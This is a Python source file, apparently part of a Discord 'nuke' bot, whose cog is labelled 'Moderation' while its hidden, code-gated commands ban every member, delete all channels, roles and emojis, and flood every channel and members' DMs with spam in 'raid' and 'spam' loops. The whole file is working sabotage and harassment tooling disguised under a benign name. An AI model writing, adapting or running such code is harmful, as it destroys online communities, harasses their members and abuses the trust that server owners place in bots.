# Scripted by Catterall (https://github.com/Catterall).
# Bot under the GNU General Public Liscense v2 (1991).


# Modules.

import discord
import random
import os
from cogs.seth_methods import CODE, refresh, command_error
from discord.ext import commands
from colorama import Fore, init
init()


class Moderation(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    # Nuke the server.

    @commands.command(hidden=True)
    async def nuke(self, ctx, code=None):
        ID = ctx.message.guild.id
        await ctx.message.delete()
        g = discord.utils.get(self.bot.guilds, id=ID)
        try:
            if int(code) != int(CODE):
                command_error("nuke")
                return
            quotes = [
                "War is peace, freedom is slavery and ignorance is strength.",
                "A true soldier fights not because he hates what is in front of him, but because he loves what is behind him.",
                "The object of war is not die for your country but to make the other bastard die for his.",
                "War does not determine who are right - only those who are left.",
                "If you are far from the enemy, make them think you are near.",
                "Only the dead have seen the end of war.",
                "Older men declare war, but it is the youth that must fight and die.",
                "War is the teacher of violence.",
                "If you know the enemy and know yourself, you need not fear the result of a hundred battles."]
            quote = quotes[random.randint(0, len(quotes) - 1)]

            # Ban all members.

            print(
                f"{Fore.LIGHTWHITE_EX}\n\n{'-'*(len(quote)+2)}\nNuke depolyed!\n\n{Fore.RESET}")
            print(f"{Fore.YELLOW}Banning server members:{Fore.RESET}")
            for member in g.members:
                try:
                    if member != ctx.author:
                        await member.ban(reason=None, delete_message_days=7)
                        print(
                            f"{Fore.LIGHTBLUE_EX}Banned {member}.{Fore.RESET}")
                    else:
                        print(f"{Fore.YELLOW}You are immune!")
                except discord.Forbidden:
                    print(f'{Fore.RED}Failed to ban {member}.{Fore.RESET}')
                except discord.HTTPException:
                    print(f'{Fore.RED}Failed to ban {member}.{Fore.RESET}')
            print(f"{Fore.LIGHTGREEN_EX}Banned all members.\n{Fore.RESET}")

            # Delete all channels.

            print(f"{Fore.YELLOW}Deleting server channels:{Fore.RESET}")
            for c in g.channels:
                try:
                    await c.delete()
                    print(
                        f'{Fore.LIGHTBLUE_EX}Channel \"{c}\" deleted.{Fore.RESET}')
                except discord.Forbidden:
                    print(
                        f'{Fore.RED}Failed to delete channel \"{c}\".{Fore.RESET}')
                except discord.HTTPException:
                    print(
                        f'{Fore.RED}Failed to delete channel \"{c}\".{Fore.RESET}')
            print(f"{Fore.LIGHTGREEN_EX}Deleted all channels.\n{Fore.RESET}")

            # Delete all roles.

            print(f"{Fore.YELLOW}Deleting server roles:{Fore.RESET}")
            roles = g.roles
            roles.pop(0)
            for role in roles:
                if g.me.roles[-1] > role:
                    try:
                        await role.delete()
                        print(
                            f'{Fore.LIGHTBLUE_EX}Role \"{role}\" deleted.{Fore.RESET}')
                    except discord.Forbidden:
                        print(
                            f'{Fore.RED}Failed to delete role \"{role}\".{Fore.RESET}')
                    except discord.HTTPException:
                        print(
                            f'{Fore.RED}Failed to delete role \"{role}\".{Fore.RESET}')
                else:
                    break
            print(f"{Fore.LIGHTGREEN_EX}Deleted all roles.\n{Fore.RESET}")

            # Delete all emojis.

            print(f"{Fore.YELLOW}Deleting server emojis:{Fore.RESET}")
            for emoji in list(g.emojis):
                try:
                    await emoji.delete()
                    print(
                        f"{Fore.LIGHTBLUE_EX}Emoji \"{emoji.name}\" deleted.{Fore.RESET}")
                except BaseException:
                    print(
                        f"{Fore.RED}Failed to delete emoji \"{emoji.name}\".{Fore.RESET}")
            print(f"{Fore.LIGHTGREEN_EX}Deleted all emojis.\n\n{Fore.RESET}")

            print(f"{Fore.LIGHTWHITE_EX}Nuke sucessfully exploded!\n{Fore.RED}\"{quote}\"{Fore.LIGHTWHITE_EX}\n{'-'*(len(quote)+2)}{Fore.RESET}")
            return
        except BaseException as e:
            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
            return

    # Delete all channels only.

    @commands.command(hidden=True)
    async def cpurge(self, ctx, code=None):
        ID = ctx.message.guild.id
        await ctx.message.delete()
        g = discord.utils.get(self.bot.guilds, id=ID)
        try:
            if int(code) != int(CODE):
                command_error("cpurge")
                return
            print(f"\n\n{Fore.LIGHTWHITE_EX}Purging channels from server, \"{g}\".")
            for c in g.channels:
                try:
                    await c.delete()
                    print(f"{Fore.LIGHTBLUE_EX}Channel {c} purged.")
                except:
                    print(f"{Fore.RED}Failed to purge channel {c}.")
            print(f"{Fore.LIGHTGREEN_EX}Channels purged from server, \"{g}\" successfully.{Fore.RESET}")
            return
        except BaseException as e:
            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
            return

    # Spam all text channels with a message.

    @commands.command(hidden=True)
    async def spam(self, ctx, code=None, *, message=None):
        ID = ctx.message.guild.id
        await ctx.message.delete()
        g = discord.utils.get(self.bot.guilds, id=ID)
        try:
            if int(code) != int(CODE):
                command_error("spam")
                return
            if message is not None:
                print(f"{Fore.LIGHTBLUE_EX}\n\nSpamming started; type {Fore.LIGHTWHITE_EX}stop {Fore.LIGHTBLUE_EX}in any text channel to stop the spamming.{Fore.RESET}")

                def check_reply(message):
                    return message.content == 'stop' and message.author == ctx.author

                async def spam_text():
                    while True:
                        for channel in g.text_channels:
                            await channel.send(message)

                spam_task = self.bot.loop.create_task(spam_text())
                await self.bot.wait_for('message', check=check_reply)
                spam_task.cancel()
                print(
                    f"{Fore.LIGHTGREEN_EX}Spamming finished successfully.{Fore.RESET}")
                return
        except BaseException as e:
            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
            return

    # Raid the server.

    @commands.command(hidden=True)
    async def raid(self, ctx, code=None, channelName=None, channelNum=None, *, msg=None):
        ID = ctx.message.guild.id
        await ctx.message.delete()
        g = discord.utils.get(self.bot.guilds, id=ID)
        try:
            if int(code) != int(CODE):
                command_error("raid")
                return
            if not code or not channelName or not channelNum or not msg:
                command_error("raid")
                return
            channelNum = int(channelNum)

            # Delete all channels.

            for c in g.channels:
                try:
                    await c.delete()
                except discord.Forbidden:
                    continue

            # Create i number of channels named <channelNum>.

            for i in range(channelNum):
                try:
                    await g.create_text_channel(channelName)
                except BaseException:
                    continue

            # Message all members with a message.

            for member in g.members:
                try:
                    if member.dm_channel is not None:
                        await member.dm_channel.send(msg)
                    else:
                        await member.create_dm()
                        await member.dm_channel.send(msg)
                except BaseException:
                    continue

            # Raid all text channels.

            print(f"{Fore.LIGHTBLUE_EX}\n\nRaiding started; type {Fore.LIGHTWHITE_EX}stop {Fore.LIGHTBLUE_EX}in any text channel to stop the raiding.{Fore.RESET}")

            def check_reply(message):
                return message.content == 'stop' and message.author == ctx.author

            async def spam_text():
                while True:
                    for channel in g.text_channels:
                        await channel.send(msg)

            spam_task = self.bot.loop.create_task(spam_text())
            await self.bot.wait_for('message', check=check_reply)
            spam_task.cancel()
            print(f"{Fore.LIGHTGREEN_EX}Raiding finished successfully.{Fore.RESET}")
            return
        except BaseException as e:
            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
            return

    # Refresh the window.

    @commands.command(hidden=True)
    async def refresh(self, ctx, code=None):
        await ctx.message.delete()
        try:
            if int(code) != int(CODE):
                command_error("refresh")
                return
            refresh()
        except BaseException as e:
            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
            return


def setup(bot):
    bot.add_cog(Moderation(bot))

# Scripted by Catterall (https://github.com/Catterall).
# Bot under the GNU General Public Liscense v2 (1991).
